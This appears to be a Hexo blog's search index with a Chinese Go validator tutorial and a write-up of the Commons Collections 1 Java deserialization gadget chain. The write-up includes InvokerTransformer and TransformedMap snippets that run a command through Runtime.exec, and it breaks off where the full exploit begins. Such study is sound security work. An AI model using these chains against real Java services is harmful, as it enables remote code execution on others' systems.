<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>validator实现参数校验</title>
    <link href="/2023/12/02/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/"/>
    <url>/2023/12/02/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="一-导入包："><a href="#一-导入包：" class="headerlink" title="一.导入包："></a>一.导入包：</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> get github.com/<span class="hljs-keyword">go</span>-playground/validator/v10<br></code></pre></td></tr></table></figure><h1 id="二-基本语法："><a href="#二-基本语法：" class="headerlink" title="二.基本语法："></a>二.基本语法：</h1><table><thead><tr><th align="center">标记</th><th align="center">标记说明</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">required</td><td align="center">必填</td><td align="center">Field或Struct <code>validate:&quot;required&quot;</code></td></tr><tr><td align="center">omitempty</td><td align="center">空时忽略</td><td align="center">Field或Struct <code>validate:&quot;omitempty&quot;</code></td></tr><tr><td align="center">len</td><td align="center">长度</td><td align="center">Field <code>validate:&quot;len=0&quot;</code></td></tr><tr><td align="center">eq</td><td align="center">等于</td><td align="center">Field <code>validate:&quot;eq=0&quot;</code></td></tr><tr><td align="center">gt</td><td align="center">大于</td><td align="center">Field <code>validate:&quot;gt=0&quot;</code></td></tr><tr><td align="center">gte</td><td align="center">大于等于</td><td align="center">Field <code>validate:&quot;gte=0&quot;</code></td></tr><tr><td align="center">lt</td><td align="center">小于</td><td align="center">Field <code>validate:&quot;lt=0&quot;</code></td></tr><tr><td align="center">lte</td><td align="center">小于等于</td><td align="center">Field <code>validate:&quot;lte=0&quot;</code></td></tr><tr><td align="center">eqfield</td><td align="center">同一结构体字段相等</td><td align="center">Field <code>validate:&quot;eqfield=Field2&quot;</code></td></tr><tr><td align="center">nefield</td><td align="center">同一结构体字段不相等</td><td align="center">Field <code>validate:&quot;nefield=Field2&quot;</code></td></tr><tr><td align="center">gtfield</td><td align="center">大于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtfield=Field2&quot;</code></td></tr><tr><td align="center">gtefield</td><td align="center">大于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtefield=Field2&quot;</code></td></tr><tr><td align="center">ltfield</td><td align="center">小于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltfield=Field2&quot;</code></td></tr><tr><td align="center">ltefield</td><td align="center">小于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltefield=Field2&quot;</code></td></tr><tr><td align="center">eqcsfield</td><td align="center">跨不同结构体字段相等</td><td align="center">Struct1.Field <code>validate:&quot;eqcsfield=Struct2.Field2&quot;</code></td></tr><tr><td align="center">min</td><td align="center">最小值</td><td align="center">Field <code>validate:&quot;min=1&quot;</code></td></tr><tr><td align="center">max</td><td align="center">最大值</td><td align="center">Field <code>validate:&quot;max=2&quot;</code></td></tr><tr><td align="center">isdefault</td><td align="center">是默认值</td><td align="center">Field <code>validate:&quot;isdefault=0&quot;</code></td></tr><tr><td align="center">oneof</td><td align="center">其中之一</td><td align="center">Field <code>validate:&quot;oneof=5 7 9&quot;</code></td></tr><tr><td align="center">containsfield</td><td align="center">字段包含另一个字段</td><td align="center">Field <code>validate:&quot;containsfield=Field2&quot;</code></td></tr><tr><td align="center">email</td><td align="center">字符串值包含一个有效的电子邮件</td><td align="center">Field <code>validate:&quot;email&quot;</code></td></tr><tr><td align="center">json</td><td align="center">字符串值是否为有效的 JSON</td><td align="center">Field <code>validate:&quot;json&quot;</code></td></tr><tr><td align="center">file</td><td align="center">符串值是否包含有效的文件路径，以及该文件是否存在于计算机上</td><td align="center">Field <code>validate:&quot;file&quot;</code></td></tr><tr><td align="center">url</td><td align="center">符串值是否包含有效的 url</td><td align="center">Field <code>validate:&quot;url&quot;</code></td></tr><tr><td align="center">ip</td><td align="center">字符串值是否包含有效的 IP 地址</td><td align="center">Field <code>validate:&quot;ip&quot;</code></td></tr><tr><td align="center">ipv4</td><td align="center">字符串值是否包含有效的 ipv4地址</td><td align="center">Field <code>validate:&quot;ipv4&quot;</code></td></tr><tr><td align="center">datetime</td><td align="center">字符串值是否包含有效的 日期</td><td align="center">Field <code>validate:&quot;datetime&quot;</code></td></tr></tbody></table><h1 id="三-使用注意"><a href="#三-使用注意" class="headerlink" title="三.使用注意"></a>三.使用注意</h1><ol><li>当搜索条件与特殊标记冲突时,如：逗号（,），或操作（|），中横线（-）等则需要使用 UTF-8十六进制表示形式</li></ol><p>如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Test <span class="hljs-keyword">struct</span> &#123;<br>   Field1 <span class="hljs-type">string</span>  <span class="hljs-string">`validate:&quot;excludesall=|&quot;`</span>    <span class="hljs-comment">// 错误</span><br>   Field2 <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;excludesall=0x7C&quot;`</span> <span class="hljs-comment">// 正确.</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>可通过validationErrors :&#x3D; errs.(validator.ValidationErrors)获取错误对象自定义返回响应错误</p></li><li><p>自定义校验结果翻译</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 初始化翻译器</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateInit</span><span class="hljs-params">()</span></span> &#123;<br>zh_ch := zh.New()<br>uni := ut.New(zh_ch)               <span class="hljs-comment">// 万能翻译器，保存所有的语言环境和翻译数据</span><br>Trans, _ = uni.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>) <span class="hljs-comment">// 翻译器</span><br>Validate = validator.New()<br>_ = zh_translations.RegisterDefaultTranslations(Validate, Trans)<br><span class="hljs-comment">// 添加额外翻译</span><br>_ = Validate.RegisterTranslation(<span class="hljs-string">&quot;required_without&quot;</span>, Trans, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> ut.Add(<span class="hljs-string">&quot;required_without&quot;</span>, <span class="hljs-string">&quot;&#123;0&#125; 为必填字段!&quot;</span>, <span class="hljs-literal">true</span>)<br>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator, fe validator.FieldError)</span></span> <span class="hljs-type">string</span> &#123;<br>t, _ := ut.T(<span class="hljs-string">&quot;required_without&quot;</span>, fe.Field())<br><span class="hljs-keyword">return</span> t<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>如果需要校验多种，需要使用<code>,</code>进行分隔，如下：</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> UserLoginRequest <span class="hljs-keyword">struct</span> &#123;<br>    CaptchaCode <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;captcha_code&quot; validate:&quot;required,ValidateCaptchaCodeLength&quot;`</span><br>    UserName    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;user_name&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;用户名&quot;`</span><br>    Password    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;password&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;密码&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四-使用案例："><a href="#四-使用案例：" class="headerlink" title="四.使用案例："></a>四.使用案例：</h1><h2 id="4-1-实现国际化-中文："><a href="#4-1-实现国际化-中文：" class="headerlink" title="4.1 实现国际化&#x2F;中文："></a>4.1 实现国际化&#x2F;中文：</h2><p><code>translator := ut.New(zh.New())</code>可以实现中文翻译</p><p><code> trans, _ = translator.GetTranslator(&quot;zh&quot;)</code>这里有个坑，就是第二个参数是bool，不管是<code>en</code>还是<code>zh</code>都是会报错的，忽略可以正常运行。</p><p><code>RegisterTagNameFunc</code>就是获取我们自定义的字段的tag，后面就可以实现这个label的值加上报错信息了(label的值为中文)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitValidator</span><span class="hljs-params">()</span></span> (*validator.Validate, ut.Translator) &#123;<br>    validate = validator.New()<br>    translator := ut.New(zh.New())<br>    trans, _ = translator.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>)<br>    err := zhTrans.RegisterDefaultTranslations(validate, trans)<br>    <span class="hljs-comment">// 注册自定义方法 可以实现 label字段+错误信息</span><br>    validate.RegisterTagNameFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(fld reflect.StructField)</span></span> <span class="hljs-type">string</span> &#123;<br>       name := fld.Tag.Get(<span class="hljs-string">&quot;label&quot;</span>)<br>       <span class="hljs-keyword">return</span> name<br>    &#125;)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;registerDefaultTranslations fail: %s\n&quot;</span>, err.Error()))<br>    &#125;<br>    <span class="hljs-keyword">return</span> validate, trans<br>&#125;<br></code></pre></td></tr></table></figure><p>在gin中如何校验？</p><p>使用<code>validator.Struct</code>就可以对其进行校验了，如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := global.Validator.Struct(&amp;req); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, fieldError := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>response.FailWithMessage(fieldError.Translate(global.Translator), ctx)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>fieldError</code>我们可以获取当前报错的字段的信息如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-自定义校验方法："><a href="#4-2-自定义校验方法：" class="headerlink" title="4.2 自定义校验方法："></a>4.2 自定义校验方法：</h2><p>需要自定义校验方法，只需要使用<code>RegisterValidation</code>即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// RegisterValidation adds a validation with the given tag</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// NOTES:</span><br><span class="hljs-comment">// - if the key already exists, the previous validation function will be replaced.</span><br><span class="hljs-comment">// - this method is not thread-safe it is intended that these all be registered prior to any validation</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validate)</span></span> RegisterValidation(tag <span class="hljs-type">string</span>, fn Func, callValidationEvenIfNull ...<span class="hljs-type">bool</span>) <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-keyword">return</span> v.RegisterValidationCtx(tag, wrapFunc(fn), callValidationEvenIfNull...)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Func</code>是一个<code>type Func func(fl FieldLevel) bool</code></p><p>这里的方法，可以写指针接收者，也可以写直接收者都是无所谓的，返回值一定需要是布尔类型，</p><p>完整代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;github.com/go-playground/validator/v10&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>FirstName <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>LastName  <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>Age       <span class="hljs-type">uint8</span>  <span class="hljs-string">`validate:&quot;validateAge&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> ValidateAge(fl validator.FieldLevel) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 在自定义验证方法中获取字段的值</span><br><span class="hljs-keyword">return</span> fl.Field().Uint() &gt; <span class="hljs-number">4</span><br>&#125;<br><br><span class="hljs-keyword">var</span> validate *validator.Validate<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>validate = validator.New()<br>user := &amp;User&#123;<br>FirstName: <span class="hljs-string">&quot;Badger&quot;</span>,<br>LastName:  <span class="hljs-string">&quot;Smith&quot;</span>,<br>Age:       <span class="hljs-number">34</span>,<br>&#125;<br>validate.RegisterValidation(<span class="hljs-string">&quot;validateAge&quot;</span>, user.ValidateAge)<br>validateStruct(user)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateStruct</span><span class="hljs-params">(user *User)</span></span> &#123;<br><br>err := validate.Struct(user)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关键点在于：</p><ol><li>tag中定义我们需要的校验方法</li><li>使用<code>RegisterValidation(tag,function) bool</code>方法注册校验方法</li></ol>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链2</title>
    <link href="/2023/10/27/cc1%E8%B0%83%E7%94%A8%E9%93%BE2/"/>
    <url>/2023/10/27/cc1%E8%B0%83%E7%94%A8%E9%93%BE2/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链</title>
    <link href="/2023/10/26/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/"/>
    <url>/2023/10/26/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/</url>
    
    <content type="html"><![CDATA[<h1 id="1-配置环境："><a href="#1-配置环境：" class="headerlink" title="1. 配置环境："></a>1. 配置环境：</h1><p>cc1调用链需要环境如下:</p><ul><li>jdk1.8.0_65</li><li>commons-collections 版本号为<code>3.2.1</code></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">jdk1.8_65源码</a></li></ul><ol><li>下载<code>jdk 8u65</code> <a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">Oracle JDK 8u65 全平台安装包下载 - 码霸霸 (lupf.cn)</a></li><li>导入坐标如下</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>解压jdk1.8.0_65下是src文件，将jdk1.8.0_65源码中的<code>src/share/clasess/sun</code>添加到你配置的1.8.0_65中的<code>src</code>目录中。</li></ol><p>教程：</p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p><h1 id="2-思路："><a href="#2-思路：" class="headerlink" title="2. 思路："></a>2. 思路：</h1><p><img src="/./../blog_image/image-20231023230226781-1698124632828-1.png" alt="image-20231023230226781"></p><p>从调用危险方法到调用顶层<code>readObject</code>实现反序列化</p><h1 id="3-探索："><a href="#3-探索：" class="headerlink" title="3. 探索："></a>3. 探索：</h1><h2 id="3-1-简单找个危险函数："><a href="#3-1-简单找个危险函数：" class="headerlink" title="3.1 简单找个危险函数："></a>3.1 简单找个危险函数：</h2><h3 id="突破口-transform方法："><a href="#突破口-transform方法：" class="headerlink" title="- 突破口 transform方法："></a>- 突破口 transform方法：</h3><p>找到一个接口，查看他的实现类</p><p><img src="/./../blog_image/image-20231023230454765.png" alt="image-20231023230454765"></p><p>找到一个<code>InvokerTranformer</code>类的<code>transform</code>方法，接收参数是可控的，即获取了当前传入obejct类，然后调用反射去调用成员变量的函数名和函数参数，找到他的构造函数</p><p><img src="/./../blog_image/image-20231023230819092.png" alt="image-20231023230819092"></p><p>第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。我们通过构造函数然后去调用<code>transform</code>方法即可调用我们传入类的方法了。</p><p>我们任意调用的方法是这样的<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>这里使用<code>InvokerTransformer</code>就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        .transform(runtime);<br></code></pre></td></tr></table></figure><h3 id="解决Runtime不能反序列化"><a href="#解决Runtime不能反序列化" class="headerlink" title="- 解决Runtime不能反序列化"></a>- 解决Runtime不能反序列化</h3><p>找到突破口之后，我们要想<code>readObject</code>方法是反序列化才会使用，但是<code>Runtime</code>没有实现<code>SSerializable</code>方法，因此不能实现反序列化。</p><p>如何解决？Class类都是可序列化的，因此我们序列化<code>Runtime.class</code>。</p><p>查看源码发现，<code>Runtime</code>类的构造方法都是私有的，只有一个静态方法<code>getRuntime</code>返回<code>currentRuntime</code>，用到的是单例模式。因此只能反射调用<code>getRuntime</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// InvokerTransformer 传入形参会通过反射进行调用</span><br>Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeClassMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) runtimeClassMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>首先获取Runtime.class这个class对象</li><li>然后调用<code>getRuntime</code>静态方法获取当前的<code>runtimeClassMethod</code>方法。</li><li>然后使用<code>runtimeClassMethod</code>方法类去<code>invoke</code>，即调用<code>getRuntime</code>方法，<code>invoke</code>方法第一个参数是类的实例对象，第二个参数是这个方法执行的参数。因为需要<code>Runtime</code>类才能调用这个私有方法，因此第一个参数是我们上面获取到的对象。</li></ul><h2 id="3-2-TransformedMap类："><a href="#3-2-TransformedMap类：" class="headerlink" title="3.2 TransformedMap类："></a>3.2 TransformedMap类：</h2><p>上面我们查找到了调用<code>TransformedMap</code>类中的<code>checkSetValue</code>方法，我们接着网上找，发现<code>AbstractInputCheckedMapDecorator</code>类中的内部类<code>MapEntry</code>的<code>setValue</code>方法调用了他，只要我们执行map的<code>setValue</code>将我们上面的<code>Object Input</code>传入进去就可以执行了，如下：</p><p><img src="/./../blog_image/image-20231026162650565.png" alt="image-20231026162650565"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code>方法。</p><p><img src="/./../blog_image/image-20231026162832837.png" alt="image-20231026162832837"></p><p>编写构造链如图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp02</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// TransformedMap 这个类继承AbstractInputCheckedMapDecorator类 重写了checkSetValue 方法</span><br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator 类中的一个匿名MapEntry类调用setValue方法 回调用checkSetValue</span><br>    <span class="hljs-comment">// 尝试调用MapEntry的set方法</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>        entry.setValue(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续网上查询，查找谁调用了<code>setValue()</code>方法，发现存在许多方法，我们的目的是查找<code>readObejct</code>方法，在<code>readObejct</code>方法中调用<code>setValue()</code>方法既可以实现放序列化，查找到<code>sun.reflect.annotation</code>包中的<code>AnnotationInnvocationHandler</code>的<code>readObejct</code>方法调用了<code>AbstractInputCheckedMapDecorator</code>中的<code>setVale()</code>方法。</p><p><img src="/./../blog_image/image-20231026162954726.png" alt="image-20231026162954726"></p><p>至此调用链就清楚了：</p><p><img src="/./../blog_image/image-20231026170328365.png" alt="image-20231026170328365"></p><p><code>readObjetc</code>中的判断如下：</p><p><img src="/./../blog_image/image-20231026172019179.png" alt="image-20231026172019179"></p><ol><li>将我们的map的key设置为一个注解中的成员变量，如<code>Target</code>注解存在一个成员变量<code>value</code>。</li></ol><p><img src="/./../blog_image/image-20231026172425292.png" alt="image-20231026172425292"></p><p>然后创建一个代理对象，去调用了我们熟悉的<code>AbstractInputCheckedMapDecorator</code>的<code>setValue</code>方法。</p><p><img src="/./../blog_image/image-20231026172616941.png" alt="image-20231026172616941"></p><p>因此思路在于如何修改这个<code>parent</code>对象的属性，可以没有办法。查找其他<code>transform</code>发现<code>ConstantTransformer</code>中<code>transform</code>不管输入什么都是调用他的成员变量，因此可以只要我们在创建的时候将<code>Runtime.class</code>赋值给他的成员变量，然后去调用<code>transform</code>方法就会返回<code>Runtime.class</code></p><h2 id="3-3-完整exp"><a href="#3-3-完整exp" class="headerlink" title="3.3 完整exp:"></a>3.3 完整exp:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 